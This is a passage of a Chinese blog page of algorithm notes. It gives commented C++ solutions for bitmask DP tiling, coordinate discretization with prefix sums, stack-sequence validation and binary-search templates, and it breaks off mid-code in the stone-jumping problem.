class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">12</span>,M=<span class="hljs-number">1</span>&lt;&lt;N;<br><span class="hljs-type">bool</span> col_state[N];<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> dp[N][M];<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">row_state</span>(M);<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n&gt;&gt;m)&#123;<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span> &amp;&amp; m == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>; <br>        <span class="hljs-comment">//两个都为0代表输入结束</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;(<span class="hljs-number">1</span>&lt;&lt;n);i++)&#123; <br>            <span class="hljs-comment">//首先要预处理一列中的每一种状态，如果出现奇数个空格，那么就不能填满</span><br>            <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>; <br>            <span class="hljs-comment">//先初始化为0</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j&lt;n;j++)&#123; <br>                <span class="hljs-comment">//寻找每一位连续空闲的个数</span><br>                <span class="hljs-keyword">if</span>((i&gt;&gt;j) &amp; <span class="hljs-number">1</span>)&#123; <br>                    <span class="hljs-comment">// 如果说当前被占用了，说明连续空闲已经结束</span><br>                    <span class="hljs-keyword">if</span>(cnt &amp; <span class="hljs-number">1</span>)&#123;<br>                        <span class="hljs-comment">//判断连续空闲个数是否是奇数个，如果是的话，那么当前状态就有问题</span><br>                        col_state[i] = <span class="hljs-literal">false</span>;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    cnt = <span class="hljs-number">0</span>; <br>                    <span class="hljs-comment">// 当前连续空闲个数恢复成0</span><br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    cnt++; <br>                    <span class="hljs-comment">// 如果当前没被占用，那么连续空闲个数就加1</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(cnt &amp; <span class="hljs-number">1</span>) col_state[i] = <span class="hljs-literal">false</span>; <br>            <span class="hljs-comment">// 处理特殊情况，如果说当前二进制数最高位为0（没被占用的话）</span><br>           <span class="hljs-comment">// 那么我们就没办法判断末尾连续空闲个数是否为奇数，所以要特判</span><br>            <span class="hljs-keyword">else</span> col_state[i] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-comment">//如果都是偶数，说明当前列中的状态是可行的。</span><br>        &#125;<br>        <br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;(<span class="hljs-number">1</span>&lt;&lt;n);i++)&#123;<br>            <span class="hljs-comment">// 遍历第i列的每一种状态</span><br>            row_state[i].<span class="hljs-built_in">clear</span>();<br>            <span class="hljs-comment">// 清空当前预处理的值，否则可能会对下一输入的例子造成影响</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j&lt;(<span class="hljs-number">1</span>&lt;&lt;n);j++)&#123;<br><span class="hljs-comment">// 遍历第i-1列的每一种状态</span><br>                <span class="hljs-keyword">if</span>((j &amp; i) == <span class="hljs-number">0</span> &amp;&amp; col_state[j | i])&#123;<br>                    <span class="hljs-comment">// 如果第i-1列在第i列要占用的对应格子是空出来的话，也就是格子占用了i-1列和i列，那么就没有冲突</span><br>                    <span class="hljs-comment">// 同时因为第i-1列格子是由第i-2列延申出来的，同时第i列格子是从第i-1列延申出来的</span><br>                    <span class="hljs-comment">// 所以第i列在j | i的对应格子都要被占用</span><br>                    row_state[i].<span class="hljs-built_in">push_back</span>(j);<br>                    <span class="hljs-comment">// 如果可行的话就加入数组中</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-built_in">memset</span>(dp, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> dp);  <br>        <span class="hljs-comment">// 初始化</span><br>        dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>; <br>        <span class="hljs-comment">// 因为第一列不能由-1列延申出来，所以第一列只有一种方法就是全部格子都不被占用</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;=m;i++)&#123; <br>        <span class="hljs-comment">// 遍历第2列到第m列，这里遍历到第m+1列是为了记录第m列没有凸出来的情况</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j&lt;(<span class="hljs-number">1</span>&lt;&lt;n);j++)&#123;<br>                <span class="hljs-comment">// 遍历第i列每种可能的状态</span><br>                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> k:row_state[j])&#123; <br>                    <span class="hljs-comment">// 遍历在当前状态下，第i-1可行的方案</span><br>                    dp[i][j] += dp[i<span class="hljs-number">-1</span>][k];<br>                &#125;<br>            &#125;<br>        &#125;<br>        <br>        cout&lt;&lt;dp[m][<span class="hljs-number">0</span>]&lt;&lt;endl; <span class="hljs-comment">// 输出第m列且没有凸出来的情况</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="离散化"><a href="#离散化" class="headerlink" title="离散化"></a>离散化</h1><h2 id="离散化思想"><a href="#离散化思想" class="headerlink" title="离散化思想"></a>离散化思想</h2><p>为什么要离散化？</p><p>因为存储的下标实在太大了，如果直接开这么大的数组，根本不现实，第二个原因，本文是数轴，要是采用下标的话，可能存在负值，所以也不能，所以有人可能会提出用哈希表，哈希表可以吗？答案也是不可以的，因为哈希表不能像离散化那样缩小数组的空间，导致我们可能需要从-e9遍历到1e9（此处的含义就是假如我们需要计算1e-9和1e9区间内的值，那我们需要从前到后枚举，无论该值是否存在），因为哈希表不能排序，所以我们一般不能提前知道哪些数轴上的点存在哪些不存在，所以一般是从负的最小值到正的最大值都枚举一遍，时间负责度太高，于是就有了本题的离散化。</p><p>离散化的本质，是映射，将间隔很大的点，映射到相邻的数组元素中。减少对空间的需求，也减少计算量。</p><p>其实映射最大的难点是前后的映射关系，如何能够将不连续的点映射到连续的数组的下标。此处的解决办法就是开辟额外的数组存放原来的数组下标，或者说下标标志，本文是原来上的数轴上的非连续点的横坐标。<br>此处的做法是是对原来的数轴下标进行排序，再去重，为什么要去重呢，因为本题提前考虑了前缀和的思想，其实很简单，就是我们需要求出的区间内的和的两端断点不一定有元素，提前加如需要求前缀和的两个端点，有利于我们进行二分搜索，其实二分搜索里面我们一般假定有解的，如果没解的话需要特判，所以提前加入了这些元素，从而导致可能出现重复元素。</p><h2 id="例题–ACwing区间和"><a href="#例题–ACwing区间和" class="headerlink" title="例题–ACwing区间和"></a>例题–ACwing区间和</h2><p>假定有一个无限长的数轴，数轴上每个坐标上的数都是 00。</p><p>现在，我们首先进行 n 次操作，每次操作将某一位置 x上的数加 c。</p><p>接下来，进行 m次询问，每个询问包含两个整数 l 和 r，你需要求出在区间 [l,r] 之间的所有数的和。</p><h3 id="输入格式-2"><a href="#输入格式-2" class="headerlink" title="输入格式"></a>输入格式</h3><p>第一行包含两个整数 n和 m。</p><p>接下来 n行，每行包含两个整数 x 和 c。</p><p>再接下来 m行，每行包含两个整数 l 和 r。</p><h3 id="输出格式-2"><a href="#输出格式-2" class="headerlink" title="输出格式"></a>输出格式</h3><p>共 m 行，每行输出一个询问中所求的区间内数字和。</p><h3 id="数据范围-1"><a href="#数据范围-1" class="headerlink" title="数据范围"></a>数据范围</h3><p>$-10^{9} &lt; x &lt; 10^{9}$</p><p>$1\le n,m \le 10^{5}$</p><p>$-10^{9}\le l \le r \le 10^{9}$</p><p>$-10000 \le c \le 10000$</p><h3 id="输入样例：-1"><a href="#输入样例：-1" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">3 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">6</span><br><span class="hljs-symbol">7 </span><span class="hljs-number">5</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">6</span><br><span class="hljs-symbol">7 </span><span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><h3 id="输出样例：-1"><a href="#输出样例：-1" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">8<br>0<br>5<br></code></pre></td></tr></table></figure><h3 id="代码解释-1"><a href="#代码解释-1" class="headerlink" title="代码解释"></a>代码解释</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">300010</span>;<br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; PII;<br><span class="hljs-type">int</span> a[N],s[N];<br>vector&lt;<span class="hljs-type">int</span>&gt; alls;<br><span class="hljs-comment">// 记录所有需要离散化的数值</span><br>vector&lt;PII&gt; add,query;<br><span class="hljs-comment">// add用来存储对应点加的数，query用来存储查询区间</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123; <br>    <span class="hljs-comment">// 找到离散化后的下标</span><br>    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>,right = alls.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-keyword">while</span>(left&lt;right)&#123;<br>        <span class="hljs-comment">// 找到第一个大于等于x的数</span><br>        <span class="hljs-type">int</span> mid = (left + right ) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(alls[mid] &gt;= x) right = mid;<br>        <span class="hljs-keyword">else</span> left = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> left + <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 返回下表从1开始，因为这样构建前缀和比较方便</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++)&#123; <br>        <span class="hljs-type">int</span> x,c;<br>        cin&gt;&gt;x&gt;&gt;c;<br>        add.<span class="hljs-built_in">push_back</span>(&#123;x,c&#125;);<br>        alls.<span class="hljs-built_in">push_back</span>(x);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;m;i++)&#123;<br>        <span class="hljs-type">int</span> left,right;<br>        cin&gt;&gt;left&gt;&gt;right;<br>        query.<span class="hljs-built_in">push_back</span>(&#123;left,right&#125;);<br>        alls.<span class="hljs-built_in">push_back</span>(left);<br>        <span class="hljs-comment">// 将查询区间的左端点和右端点加入待离散化数组里</span><br>        <span class="hljs-comment">// 如果不离散化的区间点的话，有可能出现该区间找不到离散化后的对应下标</span><br>        alls.<span class="hljs-built_in">push_back</span>(right);<br>    &#125;<br>    <br>    <span class="hljs-built_in">sort</span>(alls.<span class="hljs-built_in">begin</span>(),alls.<span class="hljs-built_in">end</span>()); <br>    <span class="hljs-comment">// 进行排序</span><br>    alls.<span class="hljs-built_in">erase</span>(<span class="hljs-built_in">unique</span>(alls.<span class="hljs-built_in">begin</span>(),alls.<span class="hljs-built_in">end</span>()),alls.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-comment">// 去除重复的元素，防止一个点离散化到多个下标上</span><br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> item:add)&#123;<br>        <span class="hljs-type">int</span> x = <span class="hljs-built_in">find</span>(item.first);<br>        a[x] += item.second;<br>    &#125;<br>    <span class="hljs-comment">// 构建差分矩阵</span><br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;=alls.<span class="hljs-built_in">size</span>();i++)<br>        s[i] = s[i <span class="hljs-number">-1</span>] + a[i];     <br>   <span class="hljs-comment">// 构建前缀和矩阵</span><br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> item:query)&#123;<br>        <span class="hljs-type">int</span> left = <span class="hljs-built_in">find</span>(item.first);<br>        <span class="hljs-type">int</span> right = <span class="hljs-built_in">find</span>(item.second);<br>        cout&lt;&lt;s[right] - s[left - <span class="hljs-number">1</span>]&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-comment">// 找到区间对应的离散化后结果，然后运用前缀和进行求解</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="验证栈序列"><a href="#验证栈序列" class="headerlink" title="验证栈序列"></a>验证栈序列</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>给出两个序列 pushed 和 poped 两个序列，其取值从 1 到 $n(n\le100000)$。已知入栈序列是 pushed，如果出栈序列有可能是 poped，则输出 <code>Yes</code>，否则输出 <code>No</code>。为了防止骗分，每个测试点有多组数据，不超过 $5$ 组。</p><h2 id="输入格式-3"><a href="#输入格式-3" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一行一个整数 $q$，询问次数。</p><p>接下来 $q$ 个询问，对于每个询问：</p><p>第一行一个整数 $n$ 表示序列长度；</p><p>第二行 $n$ 个整数表示入栈序列；</p><p>第三行 $n$ 个整数表示出栈序列；</p><h2 id="输出格式-3"><a href="#输出格式-3" class="headerlink" title="输出格式"></a>输出格式</h2><p>对于每个询问输出答案。</p><h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">2</span><br><span class="hljs-number">5</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br><span class="hljs-symbol">5 </span><span class="hljs-number">4</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-number">4</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">4</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Yes</span><br><span class="hljs-keyword">No</span><br></code></pre></td></tr></table></figure><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><p>可以这样理解，a序列不断入栈，直到遇到和b序列当前的数相同。然后依次再不断出栈，直到栈顶和b序列当前数不同。当a序列遍历完如果栈不为空那么就不是一个合格的出栈顺序，如果为空就是合格的出栈顺序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e6</span>+<span class="hljs-number">10</span>;<br>stack&lt;<span class="hljs-type">int</span>&gt; st;<br><span class="hljs-type">int</span> a[N],b[N],num;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)&#123;<br>        cin&gt;&gt;num;<br>        <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;num;i++) cin&gt;&gt;a[i];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;num;i++) cin&gt;&gt;b[i];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;num;i++)&#123;<br>            st.<span class="hljs-built_in">push</span>(a[i]);<br>            <span class="hljs-keyword">while</span>(st.<span class="hljs-built_in">size</span>() &amp;&amp; st.<span class="hljs-built_in">top</span>() == b[cnt])&#123;<br>                st.<span class="hljs-built_in">pop</span>();<br>                cnt ++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(st.<span class="hljs-built_in">size</span>()) cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>        <span class="hljs-keyword">else</span> cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br>        <span class="hljs-keyword">while</span>(st.<span class="hljs-built_in">size</span>()) st.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="二分类题型"><a href="#二分类题型" class="headerlink" title="二分类题型"></a>二分类题型</h1><h2 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h2><p><strong>如果题目出现了“最大值最小”、“最小值最大”、“第一个大于等于该数的值”（有序）、“最后一个小于等于该数的值”（有序）的情况下就可以考虑使用二分</strong></p><p>二分模板1：（求第一个大于等于该数的值、最大值最小问题）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(left&lt;right)&#123;<br><span class="hljs-type">int</span> mid = (left + right) &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(mid)) right = mid;<br><span class="hljs-keyword">else</span> left = mid + <span class="hljs-number">1</span>;<br>&#125;<br>cout&lt;&lt;left&lt;&lt;endl;<br></code></pre></td></tr></table></figure><p>二分模板2：（求最后一个小于等于该数的值、最小值最大问题）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(left &lt; right)&#123;<br><span class="hljs-type">int</span> mid = (left + right + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(mid)) left = mid;<br><span class="hljs-keyword">else</span> right = mid - <span class="hljs-number">1</span>;<br>&#125;<br>cout&lt;&lt;right&lt;&lt;endl;<br></code></pre></td></tr></table></figure><h2 id="1-跳石头"><a href="#1-跳石头" class="headerlink" title="1. 跳石头"></a>1. 跳石头</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>一年一度的“跳石头”比赛又要开始了！</p><p>这项比赛将在一条笔直的河道中进行，河道中分布着一些巨大岩石。组委会已经选择好了两块岩石作为比赛起点和终点。在起点和终点之间，有 $N$ 块岩石（不含起点和终点的岩石）。在比赛过程中，选手们将从起点出发，每一步跳向相邻的岩石，直至到达终点。</p><p>为了提高比赛难度，组委会计划移走一些岩石，使得选手们在比赛过程中的最短跳跃距离尽可能长。由于预算限制，组委会至多从起点和终点之间移走 $M$ 块岩石（不能移走起点和终点的岩石）。</p><h3 id="输入格式-4"><a href="#输入格式-4" class="headerlink" title="输入格式"></a>输入格式</h3><p>第一行包含三个整数 $L,N,M$，分别表示起点到终点的距离，起点和终点之间的岩石数，以及组委会至多移走的岩石数。保证 $L \geq 1$ 且 $N \geq M \geq 0$。</p><p>接下来 $N$ 行，每行一个整数，第 $i$ 行的整数 $D_i,( 0 &lt; D_i &lt; L)$， 表示第 $i$ 块岩石与起点的距离。这些岩石按与起点距离从小到大的顺序给出，且不会有两个岩石出现在同一个位置。</p><h3 id="输出格式-4"><a href="#输出格式-4" class="headerlink" title="输出格式"></a>输出格式</h3><p>一个整数，即最短跳跃距离的最大值。</p><h3 id="样例-1"><a href="#样例-1" class="headerlink" title="样例"></a>样例</h3><h4 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">25 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <br><span class="hljs-number">2</span><br><span class="hljs-number">11</span><br><span class="hljs-number">14</span><br><span class="hljs-symbol">17 </span><br><span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><h4 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">4<br></code></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h4 id="输入输出样例说明"><a href="#输入输出样例说明" class="headerlink" title="输入输出样例说明"></a>输入输出样例说明</h4><p>将与起点距离为 $2$ 和 $14$ 的两个岩石移走后，最短的跳跃距离为 $4$（从与起点距离 $17$ 的岩石跳到距离 $21$ 的岩石，或者从距离 $21$ 的岩石跳到终点）。</p><h4 id="数据规模与约定"><a href="#数据规模与约定" class="headerlink" title="数据规模与约定"></a>数据规模与约定</h4><p>对于 $20%$的数据，$0 \le M \le N \le 10$。<br>对于 $50%$ 的数据，$0 \le M \le N \le 100$。<br>对于 $100%$ 的数据，$0 \le M \le N \le 50000,1 \le L<br> \le 10^9$。</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>如果直接去想做法会很困难，我们可以换一种思路去想。我们二分给定一个最小间隔距离，然后扫描一遍石头序列，如果不满足最小间隔就将该石头删去。</p><p>二分判断依据：如果删除的个数大于最多要求的个数，说明间隔大了，需要缩小范围 right&#x3D;mid。如果删除个数小于等于最多个数，那么我们可以尝试继续变大间隔，left&#x3D;mid+1；直到二分结束</p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> num[N];<br><span class="hljs-type">int</span> d,n,k;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;d&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-type">int</span> cur = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span 